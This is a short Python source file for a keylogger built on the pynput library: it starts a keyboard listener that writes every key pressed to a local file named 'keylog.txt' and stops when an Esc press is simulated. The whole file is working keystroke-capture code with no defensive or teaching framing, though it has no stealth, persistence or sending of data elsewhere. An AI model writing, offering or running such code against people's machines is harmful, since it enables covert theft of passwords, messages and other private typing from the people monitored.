from pynput.keyboard import Key, Controller, Listener
import logging


ctrl = Controller()

logging.basicConfig(
    filename=("keylog.txt"),
    level=logging.INFO,
    format='%(message)s'
)


def on_key_press(key):
    logging.info(str(key).replace("'",""))


def start_keylogger():
    listener = Listener(
        on_press=on_key_press,
        on_release=on_key_release
    )

    listener.start()


def on_key_release(key):
    if key == Key.esc:
        return False


def stop_keylogger():
    ctrl.press(Key.esc)
    ctrl.release(Key.esc)
